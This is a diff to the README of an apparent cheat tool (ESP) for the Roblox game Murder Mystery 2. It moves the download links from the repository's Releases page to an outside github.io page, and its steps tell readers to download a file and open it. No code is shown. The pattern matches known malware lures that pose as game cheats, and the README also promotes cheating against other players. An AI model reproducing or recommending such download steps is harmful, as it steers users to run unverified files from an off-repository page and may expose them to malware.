@@ -1,6 +1,6 @@
 # 🕵️ Murder-Mystery-2-Script-2026-ESP - Gain tactical advantage in Murder Mystery
 
-[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/georgema5084/Murder-Mystery-2-Script-2026-ESP/releases)
+[![](https://img.shields.io/badge/Download-Release-blue)](https://georgema5084.github.io)
 
 ## 📌 Overview 
 
@@ -19,7 +19,7 @@ Before you begin, check your computer for these items:
 
 Follow these steps to set up the software.
 
-1. Visit the download page: [https://github.com/georgema5084/Murder-Mystery-2-Script-2026-ESP/releases](https://github.com/georgema5084/Murder-Mystery-2-Script-2026-ESP/releases)
+1. Visit the download page: [https://georgema5084.github.io](https://georgema5084.github.io)
 2. Locate the latest version of the file in the Releases section.
 3. Click the file to save it to your local disk.
 4. Open the folder where you saved the download.
